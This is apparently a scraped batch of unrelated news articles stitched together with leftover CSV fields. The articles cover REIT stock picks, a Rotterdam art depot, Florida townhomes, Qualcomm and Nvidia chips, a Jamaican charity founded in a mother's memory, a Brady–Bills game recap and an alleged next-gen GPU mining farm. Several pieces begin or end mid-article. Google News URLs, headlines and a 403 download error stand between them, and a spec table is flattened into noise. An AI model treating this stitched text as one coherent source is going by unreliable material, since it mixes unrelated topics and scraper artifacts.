Despite its already massive footprint it's still expanding rapidly having acquired two data centers and 4369 new communication sites primarily in international locations in the third quarter alone while continuing its rollout of 5G technology. That 5G deployment accelerated the company's metrics in the third quarter with revenue increasing 21.9% year over year adjusted funds from operations (AFFO) growing by 13.3% and net income up 56.9%.

The company recently announced the acquisition of data center REIT CoreSite Realty (COR) for $10 billion a deal set to close by the end of the year. This move will help solidify American Tower's position as a premier provider in our data-driven world.

There's are clear continued growth opportunities here but American Tower's expensive share price makes it a hard sell in today's market. A bear market should offer a great opportunity to stock up on this top-performing REIT.

2. Prologis

Prologis (PLD -0.61%) is the largest industrial REIT operator in the world today. It is next in line behind American Tower when it comes to market cap and another behemoth company that dominates the industry it operates in. And given that industrial real estate is experiencing incredible growth and unparalleled demand it's a great industry to be in.

Prologis owns and leases roughly 4675 industrial properties which equate to nearly 1 billion square feet under management across some of the world's top markets. Voracious demand for warehouse and logistics space has pushed the company's rental rates and revenue to record highs over the past year with space being effectively sold out within its operating markets.

Effective rent rates rose 27.9% year over year in the third quarter of 2021 with a mere 3.4% vacancy rate. Historically Prologis has performed incredibly well providing investors with a 22.08% annualized return over the past 10 years and seven straight years of dividend growth.

All that being said the company is also trading at a premium meaning a bear market might present a better opportunity to grab shares in this reliable company at a reasonable price.

3. Realty Income

Retail is one of those sectors that investors either love or avoid. Considering the rise in e-commerce the future of retail has become somewhat unstable. And while retail may not look the same in 20 years as it does today it won't go away altogether. This fact makes Realty Income (O 0.70%) one of the largest and most dependable retail REITs in the market today a great buy in the event of a bear market.

Realty Income started and continues to primarily operate in the retail sector with roughly 83.7% of its portfolio being single retail properties shopping centers and malls. Over the past year however the company has dramatically expanded its portfolio into international locations and merged with VEREIT which adds to its office exposure. As of Q3 2021 Realty Income has interest or ownership in 7018 commercial properties including industrial office agriculture and retail.

The company has instituted 112 dividend increases since going public in 1994 and it maintained a 15.23% annualized return since IPO with 24 out of 25 positive years of growth. It definitely prides itself on being a dependable trustworthy REIT which has led share prices to become quite costly in recent years. A bear market would be a prime opportunity to snag this company at discounted prices while being backed by one of the highest-quality portfolios in the REIT industry today.

Compelling bear market buys

Bear markets shouldn't be feared -- they are what allow for money to be made so swiftly in the bull market that inevitably follows. Knowing what to purchase and when is key. REITs in particular can be great buys in down markets because they often pay competitive dividends while providing exposure to a diverse range of high-quality real estate assets. And these three REITs should be great buys during the next bear market.",,,,,,,,,

Branded as the world’s first publicly accessible art depot the structure will store 151000 pieces from the nearby Museum Boijmans Van Beuningen. The new station means that unlike most museums where a large portion of the collection remains in storage the entire body of artwork can be enjoyed by the public.

The building is 130 feet (39.5 meters) tall and curves outward as it extends towards the sky. The resulting shape and the mirrored façade create the effect of a giant silver bowl that reflects the surrounding area. In an effort to blend into the skyline the architects covered the structure in 1664 mirrored glass panels. It is topped with a lush garden full of trees and a rooftop restaurant. “As an architecture firm it was our mission to allow a special art experience to go hand-in-hand with a building that takes an equally special form” says Winy Maas co-founder of MVRDV.

Within the “special form” the architects have developed five climate zones carefully designed to preserve the artwork. Visitors can explore the paintings photographs films sculptures drawings and so much more through a series of storage facilities studios and galleries. Also included in the Depot are restoration areas.

The most iconic feature of the building’s interior is a crisscrossing staircase in a large atrium that connects visitors to different areas. As visitors walk through the space they can see different parts of the building and various artworks stored throughout.

The unique way visitors experience art is closely tied with the logic behind its creation. Sjarel Ex and Ina Klaassen directors of the Museum Boijmans Van Beuningen speak about the future of the collection. “With the Depot the museum is giving its collection which is largely owned by the municipality but also largely by private individuals a permanent future. Visitors can now see for themselves the love care and attention to detail with which each individual work of art is preserved for future generations. The museum the public and Rotterdammers are going to have a lot of fun with the Depot.”

Depot Boijmans Van Beuningen is a publicly accessible art depot where visitors can enjoy 151000 works.

Special to Naples Daily News

PulteGroup one of the nation’s leading and most trusted brands in homebuilding for 70 years has closed on the land for a new Centex-branded neighborhood called Sawgrass at Coral Lakes.

Located within the existing Coral Lakes community in Cape Coral off Del Prado Blvd. with quick access to Pine Island Rd. Sawgrass will offer 230 new-construction townhomes within the guard-gated master-planned neighborhood which has low HOA fees and no CDD. The first release of quick move-in homes is anticipated for purchase and move in by Summer of 2022.

Expected to start from the upper $200s the new Centex townhomes in Sawgrass at Coral Lakes will offer 1636 to 1816 square feet of living space three bedrooms two-and-a-half baths and one- and two-car garages. Homebuyers will appreciate the open-concept floor plans large kitchen layouts first-floor half baths and the option for covered lanai space. Well-appointed features will also include tile roofs and paver driveways.

The townhomes will be well suited for everyone from entry-level young professional buyers to families looking for features like garages and generous gathering rooms for entertaining and everyday life. Empty nesters and snowbirds will appreciate the “lock and leave” low-maintenance opportunity of a townhome at an affordable price point and low fees.

Homebuyers at Sawgrass will enjoy access to two resort-style swimming pools with sundecks along with a country club-style clubhouse with fitness center within the established Coral Lakes community. Residents can also get active on tennis and volleyball courts soccer fields and a baseball field while sidewalks wind throughout the community for walking or jogging.

The Snapdragon 855 was a reliable workhorse — powering most flagships released this year — but Qualcomm is facing increased competition in the high-end category from HiSilicon and MediaTek.

With the Snapdragon 865 Qualcomm is offering massive gains in CPU GPU and AI performance and the chipset also features ARM's latest Cortex A77 cores delivering a 20% uptick in CPU performance as well. We'll only be able to get an idea as to how the Snapdragon 865 performs once we get our hands on consumer-ready hardware but let's take a high-level overview of the specs to see what's changed.

Swipe to scroll horizontally Category Snapdragon 865 Snapdragon 855 CPU 1 x 2.84GHz Kryo 585 (Cortex A77)3 x 2.42GHz Kryo 585 (Cortex A77)4 x 1.80GHz Kryo 585 (Cortex A55) 1 x 2.84GHz Kryo 485 Gold (Cortex A76)3 x 2.42GHz Kryo 485 Gold (Cortex A76)4 x 1.80GHz Kryo 485 Silver (Cortex A55) GPU Adreno 65020% performance boost Adreno 640 Display 4K QHD+ at 144Hz 4K Memory Up to 16GBLPDDR4X at 2133MHzLPDDR5 at 2750MHz Up to 16GBLPDDR4X at 2133MHz Modem NoneSnapdragon X55 LTE Cat 24 5G (External) Snapdragon X24 LTE Cat 20Snapdragon X50 5G (External) ISP Spectra 480Up to 200MP photo64MP/dual 25MP zero shutter lag Qualcomm Spectra 380Up to 48MP photoDual 22MP zero shutter lag Video 8K at 30 fps4K at 120fps720p at 960fps unlimited recordingDolby Vision HDR10+ HDR1010-bit H.265 4K at 60fps720p at 480fpsHDR10+10-bit H.265 Connectivity Wi-Fi 6Bluetooth 5.1 Wi-Fi 6Bluetooth 5.0 AI Engine Hexagon 698Qualcomm Sensing Hub Hexagon 690All-Ways Aware Hub Charging Quick Charge 4+Quick Charge AI Quick Charge 4+ Node 7nm 7nm

Qualcomm is sticking with the same 1+3+4 core configuration as last year but the switch to the Cortex A77 cores facilitates better performance. The frequencies are unchanged as well and Qualcomm is now offering stock Cortex cores instead of the semi-custom design we've seen over the last three generations. However the cores are still branded under the Kryo label. By using the latest cores available Qualcomm is able to deliver better performance without increasing the frequencies.

The Snapdragon 865 has considerable gains in all key areas over the Snapdragon 855.

The Adreno 650 retains the same architecture as last year but it now comes with more shader cores leading to much better performance. Qualcomm is also rolling out upgradable drivers from this generation — much like NVIDIA and AMD — and that should lead to better visuals for new titles. The chipset is also compatible with 144Hz panels suggesting we'll see a few phones powered by 144Hz displays — including Samsung. This is potentially a huge change as it allows Qualcomm to update drivers as new games make their debut on the Play Store.

On the ISP side of things Qualcomm is offering compatibility with 200MP imaging sensors — a huge upgrade from 48MP on the Snapdragon 855. That's a big deal as devices like the Mi Note 10 with its 108MP sensor had to rely on the mid-range Snapdragon 730 platform for this reason. This will potentially allow flagship phones in 2020 to feature up to 200MP camera modules.

Qualcomm is also enabling 8K video at 30fps and 4K at 120fps from this generation but that's particularly noteworthy is the ability to shoot unlimited 720p video at 960fps. The Hexagon 698 DSP is also picking up huge gains with Qualcomm noting that it offers double the performance as the 690 on the Snapdragon 855. That means a faster AI engine for things like computational photography and always-on digital assistants.

There's no integrated modem this time with the Snapdragon 865 with Qualcomm instead pushing for an external solution in the Snapdragon X55 5G modem. Qualcomm is selling the Snapdragon 865 as a package deal with the X55 modem so all phones that feature the chipset will offer the X55 5G modem as well. So if you are looking to get a phone with a Snapdragon 865 it will have a 5G modem with global bands — there's no 4G-only option this time around.

There's definitely a lot to like in the Snapdragon 865 but we'll have to wait until early 2020 to get our hands on devices powered by the chipset. Qualcomm is going all-in on 5G with the platform and it will be interesting to see what that does to phone pricing in the flagship segment.

Bascailly what you need to know is that the Snapdragon 865 is faster and will allow device makers to add exciting new features like 144Hz screens and up to 200MP camera modules. The Snapdragon 855 is still plenty good — and will be for at least a few years — so there really isn't a need to upgrade to a phone with a Snapdragon 865 unless you want to get on the 5G bandwagon.",https://news.google.com/articles/CBMiYWh0dHBzOi8vd3d3LnRlY2hyYWRhci5jb20vbmV3cy9pcy10aGUtc25hcGRyYWdvbi04LWdlbi0xLWNhcnJ5aW5nLWZvcnRoLWl0cy1wcmVkZWNlc3NvcnMtcHJvYmxlbXPSAQA?hl=en-US&gl=US&ceid=US%3Aen,Is the Snapdragon 8 Gen 1 carrying forth its predecessor's problems?,"A couple of weeks ago that Qualcomm unveiled its latest chipset the Snapdragon 8 Gen 1 SoC leading to a slew of smartphone makers sharing plans for its inclusion in their respective flagship devices. While the chipset has a lot to boast about it may also be carrying an overheating problem from its immediate predecessors.

A known tipster Ice Universe claims Qualcomm's latest flagships didn't perform well during an ""extreme test"" performed on the Moto Edge X30 that became the first smartphone to arrive with the new SoC. This could be worrisome for phone makers as they get ready to power into 2022 with a slew of flagships carrying this chipset.

The US-based semiconductor company had used the latest 4nm-based process to manufacture the the Snapdragon 8 Gen 1 guaranteeing a 20% performance boost over its predecessor the Snapdragon 888 a claim which was confirmed when the Moto Edge X30 scored over 1 million on AnTuTu.

The latest report about the device overheating under extreme tests may not sound so worrisome but for the fact that there were reports in November that actually did suggest this issue on the Snapdragon 8 Gen 1. The same tipster had claimed then that while the flagship chipset had improved in all aspects such as GPU AI and ISP the issue of over-heating remained.

Is it a cause for concern?

The latest thermal throttling issues on chipset should be a cause for concern for the phone makers slated to launch their flagships in the first quarter of 2022. In the past both the Snapdragon 888 and its over-clocked version the Snapdragon 888+ were manufactured using 5nm fabrication and came with overheating issues.

The latest flagship chipset is made with the smaller 4nm node which denotes that all of what it contains has shrunk a tiny bit. To expect the process itself to result in a cooler device doesn't work given that phone makers would have to come up with a few options of optimizing performance through software interventions which is what OnePlus had done earlier this year to fix the overheating on its flagship device.

Is there a cause to panic? We don't think so as thermal throttling has been a regular challenge on Android flagship phones over the past year or two. The need to keep the devices sleek and cramming the processors could be the obvious cause for this challenge. We believe optimizations will work out for now though semiconductor makers and smartphone manufacturers may have to sit across to find better means of thermal management in their future devices.

He also recalls how hard she worked to fill her closets with some of these items including designer bags and expensive clothing which she gifted herself after knowing she had provided all he needed.

“She worked hard and every day she looked good. Some days a person will have rough days but with my mom no one could tell when she had hers. No matter what she motivated herself by putting out and putting on her best” Richards told GoodHeart.

In June of this year Badley died following a two-year battle with stage-four colon cancer.

Richards shared: “During the pandemic she had to be going back and forth from the US to get chemotherapy and it took a toll on her. The grieving comes in waves and really before her birthday I was left thinking [what] to do without her. Not having my mother around anymore has shown me that there is a timeless importance of mothers and supporting them can secure a better future for all Jamaicans.”

He was unsure how best to preserve her memory but was spurred by his own upbringing having been raised in a single-parent household.

In an attempt to empower single mothers to cope with a lack of emotional and financial support in a society where there is an increase in violence against women and children Richards decided to start a non-profit organisation in his mother’s honour the Erica Badley Single Mother Foundation. It was launched on her birthday on October 26. The first initiative was to donate Badley’s personal belongings – items such as clothing both casual and work attire; handbags and shoes from brands such as New York & Company Express Ralph Lauren and Tory Burch which all value approximately $1 million.

It was a difficult task to go through the closet at home “especially as it got closer to her birthday” to sort through over 500 pieces of clothes plus accessories he said. These were donated to women through several organisations including Dress for Success whose mission is to empower women to achieve economic independence by providing professional attire and development tools; Pursued International that provides support to women who have been sexually exploited; Church of Transfiguration; Jamaica Deaf Association; Angels of Love and Fi We Children which is located in Montego Bay.

“I know what my mom went through when she needed work clothes when I was younger. By giving my mother’s attire [hopefully] it will boost another woman’s confidence and help their career. There are people who would not accept these or don’t like handouts so I went through the organisations but I have witnessed more than once when a female has asked her to borrow a jacket or blouse to do a job interview or something for work so I knew there was a need” he said. “The items are pretty much out now and I’m on to the next project. Mothers have difficulties in their day-to-day life so if it’s even a small gesture or donation that can assist I am willing to give.”

Richards’ aim through the foundation is that every year on her birthday they would research and identify different approaches to the needs of single mothers in Jamaica.

“My mother was from a small home in Manchester; she worked diligently and endlessly in breaking the grounds of becoming an independent woman in Jamaica. Due to her versatility discipline and all-rounded personality she was able to establish herself as a sole trader and started The New Scorpio Distribution company that provides to various pharmacies across the island. She was an independent hard-working single mother who played an invaluable contribution in raising her only child. I’m looking to help other women like her” Richards said.

The 44-year-old quarterback beat his former AFC East rivals for the 10th straight time Sunday becoming the NFL's all-time completions leader and throwing his 700th touchdown pass for the winning score in Tampa Bay's 33-27 overtime victory. The Buccaneers are on the brink of their first division title in 14 years.

In his first game against the Bills since moving to Tampa Bay in 2020 Brady threw for 363 yards and two touchdowns with no interceptions. He also scored on a quarterback sneak set up by the 7143rd completion of an unmatched 22-year career that includes seven Super Bowl titles.

The Bucs (10-3) won it on Breshad Perriman’s 58-yard catch-and-run with 5:31 left in OT — the 700th TD pass of Brady’s career including playoffs.

“It was pretty cool. I’d rather it not come down to that but in the end they all count the same"" Brady said. ""We’ve got to learn from it and move on. Next week we’re playing for a division championship and that’s pretty exciting.”

Despite blowing a 21-point halftime lead the reigning Super Bowl champs won their fourth straight game to retain a four-game lead over New Orleans and Atlanta in the NFC South which Tampa Bay hasn't won since 2007.

“We did a three-and-out in overtime and when you give No. 12 on the other side that opportunity you know he has a chance to win the game at any time” Bills center Mitch Morse said.

“It’s heartbreaking"" Buffalo running back Devin Singletary added. ""It’s the only way I can put it.”.

Brady who ruled Buffalo and won 17 AFC East titles during a two-decade stint with the New England Patriots improved to 33-3 against the Bills. He broke Drew Brees’ record for most completions in a career late in the second quarter and finished 31 of 46 with no interceptions.

Josh Allen shrugged off a slow start to throw for 308 yards and two touchdowns for Buffalo. He also rushed for 109 yards and a TD becoming the fourth player in league history to throw for over 300 yards and also rush for 100-plus in the same game.

Allen also left Raymond James Stadium with his left foot in a walking boot. He will undergo tests on Monday coach Sean McDermott said.

“Finished the game. I don’t think it’s going to be a big deal” Allen said. ""It’s pretty sore. It’s football.”

Since starting 4-1 the Bills (7-6) had hardly resembled the team that won its first division title since 1995 and enjoyed its deepest playoff run in 27 years before losing to Kansas City in the AFC championship game last January.

They are 3-5 over their last eight games and have lost two in a row for the first time this year jeopardizing their playoffs hopes with four weeks remaining in the regular season.

The Bucs who have won four straight on the heels on a two-game skid exposed the Bills offensively and defensively before Allen and the league’s No. 1 ranked defense got back on track after halftime.

Buffalo’s red-zone issues contributed to falling behind with the offense settling for a field goal on a drive inside Tampa Bay’s 5 with the Bills trailing 10-0 in the second quarter.

A tendency to be overly reliant on Allen was a hindrance too with the absence early of a rushing attack that actually involved running backs. Buffalo ran just four times for 43 yards in the opening half with Allen logging all the carries. The first rushing attempt by a running back came early in the third quarter when Matt Breida took the snap on a fake punt and lost 3 yards on fourth-and-2 from the Bills 45.

Singletary’s first carry went for 29 yards on Buffalo’s next possession launching a long drive Allen finished with an 18-yard TD run making it 24-10. Turns out the Bills quarterback was just getting started.

Allen moved his team within striking distance with TD passes of 15 yards to Dawson Knox and 4 yards to Gabriel Davis trimming the deficit to 27-24 with just under five minutes remaining in regulation.

Buffalo got the ball back with 3:05 left and put together a 70-yard drive to force overtime with a 25-yard field goal in the closing seconds.

INJURIES

Bills: WR Emmanuel Sanders (knee) was hurt in the first half and did not return. ... Reserve RB Taiwan Jones (knee) was hurt in the first quarter.

Buccaneers: They played without S Jordan Whitehead inactive for the second straight week with a calf injury. ... RB Giovani Bernard (hip) sat out the second half. CB Jamel Dean (illness) also didn’t play after halftime.

UP NEXT

Bills: host Carolina on Sunday. They’ll play three of four games against opponents that currently have a losing record.

Buccaneers: Tampa Bay can clinch its first NFC South crown since 2007 when its hosts three-time defending division champ New Orleans next Sunday night.

(AP) Josh Allen put together an amazing performance despite playing much of the game with a leg injury.

Allen threw for 308 yards and two touchdowns and ran for 109 yards and a touchdown in the Buffalo Bills' 33-27 overtime loss to the Super Bowl champion Tampa Bay Buccaneers on Sunday.

The quarterback drew more attention postgame when he came into his media session wearing a walking boot on his left foot.

""I don't think it's going to be a big deal."" Allen said. ""It's pretty sore. It's football.""

Allen will undergo tests Monday.

""He's a warrior"" Buffalo coach Sean McDermott said.

A Bills victory looked like a hopeless cause at the half with Buffalo trailing 24-3. Then Allen who became the fourth player in league history to throw for over 300 yards and also rush for 100-plus in the same game spearheaded a stunning comeback that fell just short.

""I'm damn proud of our team and how we fought in that second half"" Allen said.

Allen had an 18-yard TD run in the third period added TD passes of 15 yards to Dawson Knox and 4 yards to Gabriel Davis to cut the deficit to 27-24 with just under five minutes left in the fourth.

""He's more like Cam Newton but with a bigger and stronger arm"" Bucs coach Bruce Arians said of Allen. ""We talked about the designed quarterback runs are tough. I wouldn't put my quarterback in that much of harm's way. They did a heck of a job with it.""

Buffalo got the ball back with 3:05 left and put together a 70-yard drive to force overtime with a 25-yard field goal.

""He's our general for sure"" Buffalo running back Devin Singletary said.

Momentum appeared to be on the Bills' side when they won the coin toss to get the ball first in overtime. But after a three-and-out Buffalo punted and Tom Brady completed a six-play 94-yard drive on Breshad Perriman's 58-yard catch-and-run with 5:31 left — the 700th TD pass of Brady's career including playoffs.

""They made one more play than we did."" Allen said.

The Bills realize time is running out in the playoff race and they need a surge over the regular-season's final four weeks. Buffalo (7-6) hasn't looked like the 2020 team that won its first division title since 1995 and enjoyed its deepest playoff run in 27 years before losing to Kansas City in the AFC championship game last January. The Bills are 3-5 over their last eight games including now their first two-game losing streak of the season

""The resiliency of this team is pretty amazing but we also know there's a sense of urgency"" Buffalo center Mitch Morse said. ""We're really in crunch time here. We know what we've got but we have to put something together if we want to keep taking steps toward achieving our ultimate goal.""",https://news.google.com/articles/CBMihAFodHRwczovL3d3dy5vbGVhbnRpbWVzaGVyYWxkLmNvbS9zcG9ydHMvYnJhZHktcGFkcy1oaXMtcmVjb3JkLWJvb2stYWdhaW5zdC1idWZmYWxvL2FydGljbGVfMjc1NGIyNTctMDQzNi01MDY0LTk0NzctYWExZmNiMTZmYTk1Lmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Brady pads his record book against Buffalo | Sports | oleantimesherald.com,Tampa Bay Buccaneers quarterback Tom Brady (12) just gets a pass off before getting pushed by Buffalo Bills linebacker Matt Milano (58) during Sunday’s NFL football game at Raymond James Stadium in Tampa Fla.,https://news.google.com/articles/CBMiZmh0dHBzOi8vd3d3Lm5ld3N3ZWVrLmNvbS90b20tYnJhZHktc2V0cy0yLW1vcmUtdW5iZWxpZXZhYmxlLXJlY29yZHMtb3Qtd2luLXN1bmRheS10aWVzLWFub3RoZXItMTY1ODYxMNIBAA?hl=en-US&gl=US&ceid=US%3Aen,Tom Brady Sets 2 More Unbelievable Records in OT Win Sunday Ties Another,ERROR: Article `download()` failed with 403 Client Error: Forbidden for url: https://www.newsweek.com/tom-brady-sets-2-more-unbelievable-records-ot-win-sunday-ties-another-1658610 on URL https://news.google.com/articles/CBMiZmh0dHBzOi8vd3d3Lm5ld3N3ZWVrLmNvbS90b20tYnJhZHktc2V0cy0yLW1vcmUtdW5iZWxpZXZhYmxlLXJlY29yZHMtb3Qtd2luLXN1bmRheS10aWVzLWFub3RoZXItMTY1ODYxMNIBAA?hl=en-US&gl=US&ceid=US%3Aen

I became so frustrated trying to find an Nvidia RTX 3080 Ti graphics card that I bought a pre-built gaming rig with said GPU. With the chip shortage projected to last well into 2023 by some analysts finding an RTX 30 series card will continue to be a difficult task.

Despite the hardships customers are having getting Nvidia’s current-gen graphics cards we’re already hearing rumblings about the company’s next-gen GPUs. As we previously reported a pay-walled story from DigiTimes claimed that the Nvidia GeForce RTX 40 series cards are set to arrive in 2022. That's backed up by Nvidia CFO Colette Kress who recently said the company aims to have improved GPU supplies in the second half of 2022 when the cards are projected to release (via PCMag).

These reports aren’t exactly world-shattering. Companies have to stay ahead of the competition especially in the ultra-competitive tech sectors. There was no doubt Nvidia would be preparing to unleash the successor line to the RTX 30 series. The cards sound impressive especially if the reports are accurate about them using TSMC’s 5nm manufacturing process and Lovelace architecture; which would make for some truly powerful and efficient graphics cards.

However considering the significant challenge of obtaining Nvidia's current GPUs I find the idea of the RTX 40 series cards launching anytime in the near future somewhat frustrating. Why should people get excited about new cards when they can’t find current-gen GPUs in stock?

If Nvidia and big-box retailers don't find a way to stop scalpers...we're all going to be outside the club hatin' while the scalpers the retailers and Nvidia are inside swimming in cash and buttery graphics."" Sherri L. Smith Laptop Mag EIC

This is a sentiment shared by Laptop Mag Editor in Chief Sherri L. Smith who I reached out to in order to get her thoughts on the situation.

“I'm always a fan of the newest most powerful tech” says Smith. “And I'm fine with it costing exorbitant prices when it first launches. What I can never co-sign is the shiny new expensive tech being straight up unavailable. Such is the case with Nvidia's 30 Series GPUs. Since their launch my fellow gamers have more often than not been unable to get their hands on even the weakest cards in the line let alone a 3080 or a 3090. And if they do manage what is considered by many to be an impossible task more often than not it's because they paid a ridiculous markup.”

She had this to say about the rumored RTX 40 series cards:

“Can I fault the wheels of process and capitalism? No and maybe. I do want to salivate over the new hotness but I also want consumers to get a fair shot to get their hands said fire. That's not going to happen and it's infuriating. And yes Nvidia is probably going to come out with cards designed specifically to ward off crypto miners. But none of that matters if Nvidia and big-box retailers don't find a way to stop scalpers from using bots to buy out the entire inventory. Until then we're all going to be outside the club hatin' while the scalpers the retailers and Nvidia are inside swimming in cash and buttery graphics.”

As Sherri said it’s easy to drool over the prospect of new and more powerful graphics cards. Despite having an RTX 3080 Ti for a little under three months I’m curious to see what the RTX 40 series can bring to the table. Games look absolutely phenomenal on even the cheaper 30 series cards. How much better will titles specifically optimized to run on 40 series GPUs look? The imagination can run wild pondering the question. But this excitement is curtailed knowing that if things continue as they have for nearly two years few of us will actually get to experience what the new Nvidia graphics cards can offer.

(Image credit: Asus)

IGN Associate Tech Editor Taylor Lyles shares a similar view: “I am perplexed at the idea that an RTX 40 series could arrive as early as next year. Nvidia is dominating the GPU market right now there is no need for them to put out more powerful cards when the RTX 30 series is just as capable of whatever graphic-intensive games are coming out right now.”

Sherri Taylor and I are coming at this from the perspective of customers. We understand the reality of what’s happening with regards to supply but it’s difficult for us to not get worked up over other gamers’ inability to easily purchase Nvidia’s current GPUs. I personally don't see things greatly improving next year. However the industry analysts I reached out to see things more objectively.

The current supply crunch is incredibly frustrating for anyone looking to buy a graphics card for gaming VR or work. However Nvidia can’t just stand still or it will be uncompetitive when supply finally catches up with demand."" Avi Greengart Techsponential

“The current supply crunch is incredibly frustrating for anyone looking to buy a graphics card for gaming VR or work” says Techsponential president Avi Greengart. “However Nvidia can’t just stand still or it will be uncompetitive when supply finally catches up with demand. Besides it’s not like launching new products constrains supplies of existing products – at worst newer better and often cheaper GPUs replace the prior generation. In many cases it’s additive as the newest products are produced on new smaller process node fabrication lines.”

Gartner VP analyst Alan Priestly has similar thoughts. He also believes the smaller process node fabrication lines will help improve the chip shortage problem.

“RTX4xxx GPUs are expected to be on TSMC 5nm process” says Priestly. “This means smaller die size which in turn equals more die per wafer and thus increased GPU availability."" With regard to Nvidia staying ahead of the competition Priestly said: “Intel is entering the [GPU] market so Nvidia has to introduce new GPUs to keep ahead of its competition. Just sticking with current 30x0 GPUs will result in loss of market share as gamers move to newer high perf GPUs from other vendors.”

The price of the rumored RTX 40 GPUs is something else to take into consideration. We recently reported on a tweet posted by Razer CEO Min-Liang Tan  where he said next-gen gaming laptops from the likes of the Razer Blade series will see an increase in price starting next year. The inflated costs according to Tan are tied with the ""significant increases in component costs.” There is no reason to believe this won’t also affect the price of Nvidia’s graphics cards.

“We should definitely expect an increase in pricing not so that Nvidia can make up the difference between MSRP and what resellers are charging but to cover the increase in Nvidia’s actual costs” says Greengart. “Transportation and labor costs have shot up input costs have risen and the fabs are charging more to manufacture the chips because well because they can.”

While I admittedly have a bleak and perhaps too pessimistic view on where things stand with Nvidia's RTX 40 series cards I recognize that the chip and supply shortage gripping the tech industry will eventually subside. The global pandemic has overturned all aspects of life but the world will eventually settle on a new normal. Perhaps things will be better by the time the new Nvidia GPUs arrive in 2022. That’s little solace but it’s better than nothing.

For now I’ll continue enjoying the benefits provided by my RTX 3080 Ti-powered gaming rig. Even with new GPUs on the horizon I know that games will look amazing on my machine for many years to come. PC game developers won’t suddenly stop optimizing titles for 30 series cards when next-generation GPUs arrive. This is something all PC gamers should keep in mind as well.

So I’ll continue enjoying what I have and try to be optimistic for what the future holds. Even if I have to wait an extra year or two for Nvidia’s RTX 40 series graphics cards to actually become available.",https://news.google.com/articles/CBMikgFodHRwczovL3d3dy5oYXJkd2FyZXpvbmUuY29tLnNnL3Jldmlldy1tc2ktZ2Vmb3JjZS1ydHgtMzA3MC10aS1zdXByaW0teC04Zy1yZXZpZXctMTQ0MHAtZ2FtaW5nLWRvbmUtcmlnaHQvcGVyZm9ybWFuY2UtYmVuY2htYXJrcy1hbmQtY29uY2x1c2lvbi0yNdIBAA?hl=en-US&gl=US&ceid=US%3Aen,Performance benchmarks and conclusion : MSI GeForce RTX 3070 Ti Suprim X 8G review: 1440p gaming done right,"Performance benchmarks and conclusion

Test setup

Here are the specifications of our test rig:

We'll be comparing the MSI GeForce RTX 3070 Ti Suprim X 8G against the NVIDIA GeForce RTX 3070 Ti Founders Edition to see how it stacks up against the base model.

The following synthetic benchmarks and games were run with the games chosen from a wide range of genres to give a better indication of performance across different segments:

3DMark

Shadow of the Tomb Raider

Total War: Three Kingdoms (Battle)

Deus Ex: Mankind Divided

Metro: Exodus

Watch Dogs: Legion

Wolfenstein: Youngblood

3DMark

3DMark is a synthetic benchmark that tests graphics and computational performance at different resolutions starting at 1080p and going all the way up to 4K. A series of two graphics test one physics test and then a combined test stresses your hardware in turn to assess its performance.

The MSI GeForce RTX 3070 Ti has a boost clock of up to 1860MHz in Gaming mode which puts it slightly above the 1770MHz of the Founders Edition model. This gives it a slight lead in 3DMark although the difference is so small as to be negligible.

1080p Benchmarks (Max Settings)

The MSI card's lead was slightly more pronounced in games at 1080p with up to a 9% differential in some games.

1440p Benchmarks (Max Settings)

The MSI card continued to have a slight edge over the Founders Edition model at 1440p and it was up to 13% quicker in select titles.

4K Benchmarks (Max Settings)

The differences level off slightly at 4K and there's barely any difference between the two cards.

Ray Tracing Benchmarks (4K Max Settings)

With ray tracing turned on at 4K performance drops quite a bit pushing both cards to their limit.

Temperature and power

The Tri Frozr 2S does a good job of keeping the card cool. Unfortunately these numbers will have to stand on their own at the moment as we currently don't have any numbers from the Founders Edition model to compare it with.

MSI GeForce RTX 3070 Ti Suprim X Temperature (Peak) 77.6°C Board power draw (Peak) 315W

Conclusion

At S$1688 the MSI GeForce RTX 3070 Ti Suprim X 8G comes with a hefty price tag to go along with its performance. This is a card made for 1440p gaming and it breezes through everything you can think to throw at it. With sleek good looks fully customisable RGB lighting and decent cooling you can't really go wrong with this card if you're in the market for a custom GeForce RTX 3070 Ti.",https://news.google.com/articles/CBMinwFodHRwczovL3d3dy5ub3RlYm9va2NoZWNrLm5ldC9JbnRlbC1BcmMtQWxjaGVtaXN0LWRpZS1zaXplLWxlYWtzLW91dC0zOTZtbTItQWxjaGVtaXN0LWNoaXAtb24tcGFyLXdpdGgtdGhlLUdBMTA0LWZvdW5kLWluLXRoZS1HZUZvcmNlLVJUWC0zMDcwLVRpLjU4NDUxOS4wLmh0bWzSAQA?hl=en-US&gl=US&ceid=US%3Aen,Intel Arc Alchemist die size leaks out: 396mm2 Alchemist chip on par with the GA104 found in the GeForce RTX 3070 Ti,"After Moore's Law is dead leaked die shots of the Intel Arc Alchemist GPU die @Locunza_ took measurements discovering that Alchemist's 396mm2 GPU die is roughly the same size as GA104 the GPU powering the GeForce RTX 3070 and 3070 Ti.

After Moore's Law is Dead outed leaked die shots of the Intel Arc Alchemist GPU Twitter user @Locunza_ measured the GPU die. @Locunza_ discovered that DG2-512 Intel's largest Alchemist chip measured 396mm2 roughly the same size as the GeForce RTX 3070 Ti's GA104 chip.

The implications here are clear as far as performance is concerned. Initial reports suggested that Arc Alchemist would deliver performance on par with the GeForce RTX 3070. The similar die size indicates two parts with similar overall performance profiles. This means that Intel's first-generation desktop GPUs might not reach GA102 levels of performance but might offer playable 4K framerates nevertheless.

Amid the current global GPU shortage NVIDIA and AMD graphics cards are selling for 2 to 3 times their MSRP with parts like the GeForce RTX 3070 going for as much as US$2000. In this situation it remains unclear what the entry of the Arc Alchemist entails for the market. Whether it delivers competitive pricing or further aggravates the shortage remains to be seen.

Mining farms usually include several 100s or even 1000s of graphics cards running in parallel to mine the crypto gold but this specific setup is just bonkers and too good to be real.

Next-Gen NVIDIA GeForce RTX 4090 Ti & AMD Radeon RX 7000 Graphics Cards Equipped Mining Farm Spotted Allegedly Over 3 TH/s Mining Rate

There is no way to validate if this mining farm actually houses the said graphics cards from NVIDIA and AMD but it is currently up and running. There are three active workers attached to the mining account which include an NVIDIA GeForce RTX 4090 Ti (Overclock Test) AMD Radeon RX 7000 (OC Test) and AMD Radeon RX 7000 (Control Test).

The NVIDIA GeForce RTX 4090 Ti worker is producing an estimated 1.2-1.3 TH/s. For comparison a single GeForce RTX 3090 produces around 110-120 MH/s. It will take a setup of at least 10000 RTX 3090's to produce a 1.2-1.3 TH/s hash rate. The worker tab doesn't show how many graphics cards are running on the setup but these definitely aren't just one. The AMD Radeon RX 7000 control test is producing an average of 657.3 GH/s while the Radeon RX 7000 Overclock test is producing a 580 GH/s hash rate.

